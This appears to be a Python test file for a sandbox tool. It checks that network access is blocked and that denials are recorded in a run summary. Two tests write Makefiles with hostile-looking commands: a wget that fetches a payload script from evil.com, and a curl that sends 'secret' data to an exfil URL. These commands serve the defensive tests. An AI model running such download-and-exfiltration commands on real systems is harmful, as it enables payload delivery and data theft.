    def test_wget_in_makefile_blocked(self):
        """A Makefile with wget | bash has network blocked."""
        with TemporaryDirectory() as d:
            makefile = Path(d) / "Makefile"
            makefile.write_text(
                "all:\n"
                "\twget -q http://evil.com/payload.sh -O /tmp/payload.sh 2>&1 || echo wget_failed\n"
                "\techo build_done\n"
            )
            result = sandbox_run(
                ["make", "-C", d],
                block_network=True,
                capture_output=True, text=True, timeout=15,
            )
            # wget should fail but make should continue
            combined = result.stdout + result.stderr
            self.assertIn("wget_failed", combined)
            # wget creates the output file but can't download — verify empty (no payload)
            payload = Path("/tmp/payload.sh")
            if payload.exists():
                self.assertEqual(payload.stat().st_size, 0, "payload.sh should be empty")
                payload.unlink()

    def test_curl_exfil_blocked(self):
        """A Makefile trying to curl data out is blocked."""
        import shutil
        if not shutil.which("curl"):
            self.skipTest("curl not installed")
        with TemporaryDirectory() as d:
            makefile = Path(d) / "Makefile"
            makefile.write_text(
                "all:\n"
                "\tcurl -s --connect-timeout 2 http://evil.com/exfil?data=secret 2>&1 || echo exfil_blocked\n"
            )
            result = sandbox_run(
                ["make", "-C", d],
                block_network=True,
                capture_output=True, text=True, timeout=15,
            )
            self.assertIn("exfil_blocked", result.stdout + result.stderr)


class TestE2ESandboxSummaryRecording(unittest.TestCase):
    """End-to-end: real sandboxed subprocess produces a real denial → the
    per-run sandbox-summary.json captures it with structured data and a
    suggested-fix hint.

    Exercises the full path: lifecycle start_run → sandbox_run with real
    enforcement → observe._check_blocked detects denial from real stderr →
    summary.record_denial appends to JSONL → lifecycle complete_run
    finalizes summary. Unlike TestLifecycleIntegration (which feeds
    synthetic stderr into _check_blocked), this proves the wiring under
    the actual sandbox layers."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

    def test_blocked_network_lands_in_sandbox_summary(self):
        import json as _json
        from core.run.metadata import start_run, complete_run
        from core.sandbox.summary import (
            DENIALS_FILE, SUMMARY_FILE, set_active_run_dir,
        )

        with TemporaryDirectory() as d:
            run_dir = Path(d) / "scan-e2e"
            try:
                start_run(run_dir, command="scan")

                # Real sandboxed subprocess that hits a blocked-network path.
                # Python socket connect produces a stderr signature
                # observe._check_blocked recognises (network category).
                sandbox_run(
                    ["python3", "-c",
                     "import socket; s=socket.socket(); s.settimeout(2); "
                     "s.connect(('1.1.1.1', 80))"],
                    block_network=True, capture_output=True, text=True, timeout=10,
                )

                complete_run(run_dir)

                # Summary file present, JSONL cleaned up
                summary_path = run_dir / SUMMARY_FILE
                self.assertTrue(summary_path.exists(),
                                f"sandbox-summary.json missing at {summary_path}")
                self.assertFalse((run_dir / DENIALS_FILE).exists(),
                                 "intermediate JSONL should be removed after summary")

                summary = _json.loads(summary_path.read_text())
                # Network denial captured
                self.assertGreaterEqual(summary["total_denials"], 1)
                self.assertIn("network", summary["by_type"])
                # At least one denial references network with a suggested fix
                # that mentions a real CLI flag
                network_denials = [d for d in summary["denials"]
                                   if d["type"] == "network"]
                self.assertGreaterEqual(len(network_denials), 1)
                fix = network_denials[0]["suggested_fix"]
                self.assertIn("--sandbox", fix)
            finally:
                # Defensive: ensure no leaked active-run state if the test
                # fails partway through (test isolation for any test that
                # runs after this one in the same process).
                set_active_run_dir(None)


if __name__ == "__main__":
    unittest.main()
